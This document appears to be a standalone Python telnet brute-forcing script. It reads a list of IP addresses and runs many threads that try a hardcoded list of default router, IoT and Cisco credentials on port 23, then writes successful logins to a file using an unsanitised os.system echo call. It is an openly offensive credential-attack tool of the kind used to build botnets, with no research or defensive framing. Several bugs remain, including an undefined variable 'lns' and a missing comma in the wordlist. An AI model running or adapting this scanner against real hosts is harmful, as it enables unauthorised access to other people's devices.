import sys,os,re,base64,subprocess,time,socket,telnetlib,threading, resource
from sys import stdout

# Starts the timer
start = time.time()

resource.setrlimit(resource.RLIMIT_NOFILE, (1000, -1))

# Telnet wordlist
# Expanded Wordlist: https://github.com/milo2012/pentest_scripts/blob/master/default_accounts_wordlist/wordList_telnet.txt
combo = [ 
    "thisisafalsealarm:thisisafalsealarm",
    "nope:nope",
    "root:root",
    "admin:admin",
    "root:",
    "admin:",
    "default:",
    "User:admin",
    "guest:12345",
    "admin:1234",
    "admin:12345",
    "admin:password",
    "ubnt:ubnt",
    "guest:guest",
    "user:user",
    "default:OxhlwSG8",
    "default:S2fGqNFs",
    "admin:smcadmin"
    "sysadm:sysadm",
    "support:support",
    "root:default",
    "root:password",
    "adm:",
    "bin:",
    "daemon:",
    "root:cat1029",
    "admin:cat1029",
    "admin:123456",
    "root:antslq",
    "cisco:cisco",
    "cisco:"
]

# Gets the input arguments
if (len(sys.argv) < 4):
    print("Usage: python3 "+sys.argv[0]+" <list> <threads> <output file>")
    sys.exit()

# Checks if the output file already exists
with open(str(sys.argv[1]), "r") as f:
    ips = f.readlines()
    ips = ''.join(map(str, ips))
    ips = ips.split("\n")
    f.close()

threads = int(sys.argv[2])
output_file = sys.argv[3]
response = ""

# Bruteforces the given IP using the 'combo' wordlist
def Brute(ip):
    Auth = False

    for passw in combo:

        # Splits username and password from wordlist
        username = passw.split(":")[0]
        password = passw.split(":")[1]

        # Starts a new connection to the socket of the given IP
        try:
            tn = socket.socket()
            tn.settimeout(8)
            target = ((str(ip), 23))
            tn.connect(target)
        except:
            break

        # Tries to access 
        try:
            username += "\n"
            username = bytes(username, 'utf-8')
            password += "\n"
            password = bytes(password, 'utf-8')
            tn.send(username)
            time.sleep(1.9)
            tn.send(password)
            time.sleep(1.8)
       	except:
       	    break

        # Gets the response of the access request
        try:
            response = tn.recv(40960)
        except:
            break

        # Checks the response and tells if it's worthy or not

        # Tells, if worthy, what type of system the access is granted to
        if (b"#" in response or b"$" in response):
            if (username != b'thisisafalsealarm\n' and  username != b'nope\n'):
                os.system("echo "+str(ip)+":23 "+str(username[:-1])+":"+str(password[:-1])+" >> "+output_file+"")
                print("\033[32m[\033[31m+\033[32m] \033[33mBRUTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(str(username[:-1]), str(password[:-1]), ip) + " \033[32m(Linux/UNIX shell)")
                Auth = True
                tn.close()
                break
            else:
                break

        elif (b"@" in response or b"%" in response or b">" in response and b"ONT" not in response ):
            if (username != b'thisisafalsealarm\n' and  username != b'nope\n' and b"invalid" not in response and b"refused" not in response and b"failed!" not in response):
                os.system("echo "+str(ip)+":23 "+str(username[:-1])+":"+str(password)+" >> "+output_file+"")
                print("\033[32m[\033[31m+\033[32m] \033[33mBRUTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(str(username[:-1]), str(password[:-1]), ip) + " \033[32m(Router/Android/UNIX shell)")
                Auth = True
                tn.close()
                break
            else:
                break

        else:
            tn.close()
    return

# Thread class
class theBruto(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = ip
    def run(self):
        Brute(self.ip)

# Runs the threads
for j in range(lns):
    print(j)
    bruting = theBruto(ips[j])
    bruting.start()

